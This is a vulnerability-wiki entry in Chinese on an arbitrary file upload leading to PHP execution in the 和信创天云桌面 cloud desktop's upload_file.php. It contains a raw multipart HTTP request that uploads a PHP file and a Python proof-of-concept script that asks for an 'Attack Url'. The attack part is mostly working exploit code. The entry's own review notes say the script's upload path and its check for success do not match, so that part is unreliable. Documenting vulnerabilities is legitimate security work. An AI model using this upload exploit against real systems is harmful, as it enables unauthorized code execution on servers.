---
source: "Threekiii/Vulnerability-Wiki"
title: "和信创天云桌面 upload_file.php任意后缀上传及PHP执行"
product: "和信创天云桌面"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "默认配置含义未说明；版本未知"
prerequisites: "手工请求有Session，脚本无Cookie"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2/%E5%92%8C%E4%BF%A1%E5%88%9B%E5%A4%A9%E4%BA%91%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-RCE%E6%BC%8F%E6%B4%9E.md"
id: "vw-e2b48086df8cf263d4c6e371"
entity_id: "ve-e2b48086df8cf263d4c6e371"
schema_version: "1"
---

# 和信创天云桌面 upload_file.php任意后缀上传及PHP执行

## 条目说明

- 对象与具体问题：和信创天云桌面；upload_file.php任意后缀上传及PHP执行
- 版本、配置及部署条件：默认配置含义未说明；版本未知
- 认证与权限前提：手工请求有Session，脚本无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 脚本上传test.php却GET config.php并匹配shell，而payload是phpinfo，路径与结果判定不一致，明确不可据此判断
- Base64正文包含多余Content-Type头前言，multipart构造需重建；Requst返回拼写依赖未解释
- 正文l=1路径/脚本l=test是可变目录，需统一示例参数与输出
- 标题RCE应区分上传和PHP执行；默认配置/鉴权/修复缺，版本字段产品名

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

和信创天云桌面系统存在默认配置导致文件上传并可以远程命令执行

### 漏洞影响

```
和信创天云桌面系统
```

### 漏洞复现

登录页面如下

![](./.resource/和信创天云桌面系统-远程命令执行-RCE漏洞/media/202202101932477.png)


发送请求包如下


```http
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: xxx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/avif

<?php phpinfo(); ?>
------WebKitFormBoundaryfcKRltGv--
```

> 请求长度说明：原资料 Content-Length 为 182；静态长度已移除，应由客户端根据最终请求体的字节数生成。


访问


```plain
http://xxx.xx.xxx.xxx/Upload/1/test.php
```


![](./.resource/和信创天云桌面系统-远程命令执行-RCE漏洞/media/202202101932224.png)


### 漏洞POC


```python
import requests
import sys
import random
import base64
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 和信云桌面任意文件上传漏洞                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/Upload/upload_file.php?l=test"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
    }
    data = base64.b64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "Requst" in response.text and response.status_code == 200:
            webshell_url = target_url + "/Upload/test/config.php"
            response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
            if "shell" in response.text and response.status_code == 200:
                print("\033[32m[o] 目标 {}存在漏洞 config.php\n[o] 路径为 {}/Upload/test/config.php\033[0m".format(target_url, target_url))
            else:
                print("\033[31m[x] 请求失败 \033[0m")
                sys.exit(0)
        else:
            print("\033[31m[x] 上传失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```


![](./.resource/和信创天云桌面系统-远程命令执行-RCE漏洞/media/202202101932876.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
